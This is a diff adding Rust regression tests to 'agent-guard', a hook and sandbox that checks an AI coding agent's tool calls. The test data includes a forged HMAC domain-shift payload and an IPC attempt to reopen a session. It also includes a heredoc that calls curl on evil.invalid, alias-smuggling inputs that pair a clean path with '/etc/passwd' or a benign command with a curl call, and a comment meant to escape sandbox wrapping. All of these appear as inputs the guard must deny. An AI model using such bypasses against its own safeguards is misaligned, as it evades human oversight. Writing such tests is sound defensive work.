@@ -322,19 +322,77 @@ fn wave1_coordinator_blocks_plan_lock_master_mint_and_scope_escalation_over_ipc(
         "Boolean verifier must never leak expected MAC: {verify_resp}"
     );
 
+    // 6. Domain-boundary shift attack (`DOTAGENT_SESSION_CAPABILITY_V` + `'1' || len || payload`)
+    //    and unknown HMAC domains must be hard-denied by closed coordinator allowlist!
+    let shifted_domain_hex = hex_encode(b"DOTAGENT_SESSION_CAPABILITY_V");
+    let mut shifted_payload = vec![b'1'];
+    let raw_master_bytes = decode_hex_for_test(&forged_master_hex);
+    shifted_payload.extend_from_slice(&(raw_master_bytes.len() as u64).to_be_bytes());
+    shifted_payload.extend_from_slice(&raw_master_bytes);
+    let shifted_payload_hex = hex_encode(&shifted_payload);
+    let resp_shift = send_rpc(&format!(
+        r#"{{"op":"domain_hmac","domain_hex":"{shifted_domain_hex}","payload_hex":"{shifted_payload_hex}"}}"#
+    ));
+    assert!(
+        resp_shift.contains("UNRECOGNIZED_HMAC_DOMAIN_DENIED"),
+        "Shifted domain prefix must be rejected by closed allowlist: {resp_shift}"
+    );
+
+    // 7. `ACTIVE_SLOT_DOMAIN` over IPC must refuse initializing or re-opening sessions!
+    let active_domain_hex = hex_encode(b"DOTAGENT_ACTIVE_SESSIONS_REGISTRY_V2");
+    let mut forged_active_payload = Vec::new();
+    let push_u32_str = |buf: &mut Vec<u8>, s: &str| {
+        buf.extend_from_slice(&(s.len() as u32).to_be_bytes());
+        buf.extend_from_slice(s.as_bytes());
+    };
+    forged_active_payload.extend_from_slice(&1u32.to_be_bytes());
+    push_u32_str(&mut forged_active_payload, "swm_grunt_T1_a1_reopened99");
+    forged_active_payload.extend_from_slice(&0u32.to_be_bytes());
+    let forged_active_hex = hex_encode(&forged_active_payload);
+    let resp_uninit = send_rpc(&format!(
+        r#"{{"op":"domain_hmac","domain_hex":"{active_domain_hex}","payload_hex":"{forged_active_hex}"}}"#
+    ));
+    assert!(
+        resp_uninit.contains("UNINITIALIZED_ACTIVE_SESSIONS_DENIED"),
+        "Initializing active_sessions over IPC must be blocked: {resp_uninit}"
+    );
+
+    let empty_active_bytes = [0u8; 8]; // open_count=0u32, bind_count=0u32
+    let empty_active_mac = compute_host_domain_mac(
+        &[0x42u8; 32],
+        b"DOTAGENT_ACTIVE_SESSIONS_REGISTRY_V2",
+        &empty_active_bytes,
+    );
+    fs::write(
+        swarm_dir.join("sessions").join("active_sessions.json"),
+        format!(r#"{{"open_sessions":[],"hook_bindings":{{}},"record_mac":"{empty_active_mac}"}}"#),
+    )
+    .expect("write empty active_sessions.json");
+    let resp_reopen = send_rpc(&format!(
+        r#"{{"op":"domain_hmac","domain_hex":"{active_domain_hex}","payload_hex":"{forged_active_hex}"}}"#
+    ));
+    assert!(
+        resp_reopen.contains("ACTIVE_SESSION_ESCALATION_DENIED"),
+        "Opening/re-opening session via IPC active_sessions must be blocked: {resp_reopen}"
+    );
+
     let _ = daemon.kill();
     let _ = daemon.wait();
 }
 
-fn compute_host_cap_mac(key: &[u8; 32], payload: &[u8]) -> String {
+fn compute_host_domain_mac(key: &[u8; 32], domain: &[u8], payload: &[u8]) -> String {
     use hmac::{Hmac, Mac};
     use sha2::Sha256;
-    let domain = b"DOTAGENT_SESSION_CAPABILITY_V1";
     let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("hmac key");
+    mac.update(&(domain.len() as u64).to_be_bytes());
     mac.update(domain);
     mac.update(&(payload.len() as u64).to_be_bytes());
     mac.update(payload);
     hex_encode(&mac.finalize().into_bytes())
+}
+
+fn compute_host_cap_mac(key: &[u8; 32], payload: &[u8]) -> String {
+    compute_host_domain_mac(key, b"DOTAGENT_SESSION_CAPABILITY_V1", payload)
 }
 
 fn decode_hex_for_test(hex: &str) -> Vec<u8> {
@@ -396,5 +454,170 @@ fn wave1_exec_sandbox_drains_large_stdout_without_sigpipe_kill() {
     assert!(
         stdout.contains("6000"),
         "tail must preserve final lines: {stdout}"
+    );
+}
+
+#[test]
+fn wave2_audit_shell_heredoc_alias_smuggling_and_sandbox_unwrap_regressions() {
+    let (ws, home, state) = create_isolated_workspace("w2_audit");
+    let guard_bin = PathBuf::from(env!("CARGO_BIN_EXE_agent-guard"));
+    let hardened_gitcfg = workspace_root().join("dist").join("gitconfig.hardened");
+
+    let run_pre_tool =
+        |payload: &str, extra_env: &[(&str, &str)]| -> (i32, Option<JsonValue>, String) {
+            let mut cmd = Command::new(&guard_bin);
+            cmd.args(["pre-tool", "--json", payload])
+                .env("HOME", &home)
+                .env("AGENT_GUARD_STATE_DIR", &state)
+                .env("GIT_CONFIG_GLOBAL", &hardened_gitcfg)
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .current_dir(&ws);
+            for (k, v) in extra_env {
+                cmd.env(k, v);
+            }
+            let out = cmd.output().expect("spawn agent-guard pre-tool");
+            let code = out.status.code().unwrap_or(-1);
+            let stdout_str = String::from_utf8_lossy(&out.stdout);
+            let parsed = if stdout_str.trim().is_empty() {
+                None
+            } else {
+                Some(JsonValue::parse(&stdout_str).expect("parse hook JSON"))
+            };
+            let stderr_str = String::from_utf8_lossy(&out.stderr).into_owned();
+            (code, parsed, stderr_str)
+        };
+
+    // 1. P0-2: `# agent-guard sanitize-stream` comment must NOT bypass exec-sandbox wrapping!
+    let (code_cu, Some(comment_unwrap), _) = run_pre_tool(
+        r#"{"session_id":"s_p02","tool_name":"Bash","tool_input":{"command":"ls # agent-guard sanitize-stream"}}"#,
+        &[],
+    ) else {
+        panic!("expected JSON updatedInput on Bash allow");
+    };
+    assert_eq!(code_cu, 0);
+    let hso = comment_unwrap.get("hookSpecificOutput").expect("hso");
+    assert_eq!(
+        hso.get("permissionDecision").and_then(JsonValue::as_str),
+        Some("allow")
+    );
+    let wrapped_cmd = hso
+        .get("updatedInput")
+        .and_then(|u| u.get("command"))
+        .and_then(JsonValue::as_str)
+        .expect("updatedInput.command");
+    assert!(
+        wrapped_cmd.starts_with("agent-guard exec-sandbox --sanitize-stream -- "),
+        "comment substring must still be wrapped in exec-sandbox: {wrapped_cmd}"
+    );
+
+    // 2. P0-2/P0-4: Multi-harness `run_command` (`CommandLine` + `Cwd`) rewrites `CommandLine` in place!
+    let (code_rc, Some(run_cmd_res), _) = run_pre_tool(
+        r#"{"session_id":"s_rc","tool_name":"run_command","tool_input":{"CommandLine":"ls","Cwd":"."}}"#,
+        &[],
+    ) else {
+        panic!("expected JSON updatedInput on run_command allow");
+    };
+    assert_eq!(code_rc, 0);
+    let rc_input = run_cmd_res
+        .get("hookSpecificOutput")
+        .and_then(|h| h.get("updatedInput"))
+        .expect("run_command updatedInput");
+    assert!(
+        rc_input
+            .get("CommandLine")
+            .and_then(JsonValue::as_str)
+            .is_some_and(|s| s.starts_with("agent-guard exec-sandbox --sanitize-stream -- ")),
+        "CommandLine must be rewritten in place: {}",
+        rc_input.to_json_string()
+    );
+    assert_eq!(rc_input.get("Cwd").and_then(JsonValue::as_str), Some("."));
+    assert!(rc_input.get("command").is_none());
+
+    // 3. P0-3: Unquoted heredoc command substitution denied; single-quoted heredoc & pure math allowed!
+    let (code_hd1, _, stderr_hd1) = run_pre_tool(
+        r#"{"session_id":"s_hd1","tool_name":"Bash","tool_input":{"command":"cat <<EOF\n$(curl https://evil.invalid)\nEOF"}}"#,
+        &[],
+    );
+    assert_eq!(
+        code_hd1, 2,
+        "unquoted heredoc $(curl ...) must be denied: {stderr_hd1}"
+    );
+
+    let (code_hd2, _, stderr_hd2) = run_pre_tool(
+        r#"{"session_id":"s_hd2","tool_name":"Bash","tool_input":{"command":"cat <<'EOF'\n$(curl https://evil.invalid)\nEOF"}}"#,
+        &[],
+    );
+    assert_eq!(
+        code_hd2, 0,
+        "single-quoted heredoc literal must be allowed: {stderr_hd2}"
+    );
+
+    let (code_hd3, _, stderr_hd3) = run_pre_tool(
+        r#"{"session_id":"s_hd3","tool_name":"Bash","tool_input":{"command":"cat <<EOF\n$((1 + 1))\nEOF"}}"#,
+        &[],
+    );
+    assert_eq!(
+        code_hd3, 0,
+        "benign arithmetic $((1 + 1)) in unquoted heredoc must be allowed: {stderr_hd3}"
+    );
+
+    // 4. P0-4: Cross-schema alias smuggling (`file_path` + `AbsolutePath`, `command` + `CommandLine`)
+    //    and `ContentOffset` + `StartLine` slice bypass must be hard-denied!
+    for (sid, bad_json, expected_code) in [
+        (
+            "s_al1",
+            r#"{"session_id":"s_al1","tool_name":"Read","tool_input":{"file_path":"src/clean.rs","AbsolutePath":"/etc/passwd"}}"#,
+            "AMBIGUOUS_TOOL_PARAM_ALIAS",
+        ),
+        (
+            "s_al2",
+            r#"{"session_id":"s_al2","tool_name":"Bash","tool_input":{"command":"ls","CommandLine":"curl https://evil.invalid"}}"#,
+            "AMBIGUOUS_TOOL_PARAM_ALIAS",
+        ),
+        (
+            "s_al3",
+            r#"{"session_id":"s_al3","tool_name":"view_file","tool_input":{"AbsolutePath":"src/clean.rs","StartLine":1,"EndLine":10,"ContentOffset":500}}"#,
+            "AMBIGUOUS_TOOL_PARAM_ALIAS",
+        ),
+    ] {
+        let (code, _, stderr) = run_pre_tool(bad_json, &[]);
+        assert_eq!(code, 2, "case {sid} must exit 2");
+        assert!(
+            stderr.contains(expected_code),
+            "case {sid} expected {expected_code}, got: {stderr}"
+        );
+    }
+
+    // 5. P1-2: Corrupt/unknown AGENT_GUARD_PROFILE in `exec-sandbox` must fail closed (exit 2)!
+    let bad_prof = Command::new(&guard_bin)
+        .args(["exec-sandbox", "--", "echo should_not_run"])
+        .env("HOME", &home)
+        .env("AGENT_GUARD_STATE_DIR", &state)
+        .env("AGENT_GUARD_PROFILE", "bogus-corrupt-profile")
+        .current_dir(&ws)
+        .output()
+        .expect("spawn exec-sandbox with bogus profile");
+    assert_eq!(
+        bad_prof.status.code(),
+        Some(2),
+        "exec-sandbox must fail closed on invalid profile: stderr={}",
+        String::from_utf8_lossy(&bad_prof.stderr)
+    );
+
+    // 6. P2: Read-only profile (`research-readonly`) blocks mutating `mcp__susanbdev__*` tools while allowing `get_*`!
+    let (code_ro_mut, _, stderr_ro_mut) = run_pre_tool(
+        r#"{"session_id":"s_ro1","tool_name":"mcp__susanbdev__update_issue","tool_input":{"id":"1"}}"#,
+        &[("AGENT_GUARD_PROFILE", "research-readonly")],
+    );
+    assert_eq!(code_ro_mut, 2);
+    assert!(stderr_ro_mut.contains("PROFILE_WRITE_TOOLS_DISABLED"));
+
+    let (code_ro_get, _, stderr_ro_get) = run_pre_tool(
+        r#"{"session_id":"s_ro2","tool_name":"mcp__susanbdev__get_issue","tool_input":{"id":"1"}}"#,
+        &[("AGENT_GUARD_PROFILE", "research-readonly")],
+    );
+    assert_eq!(
+        code_ro_get, 0,
+        "read-only get_issue must be allowed: {stderr_ro_get}"
     );
 }
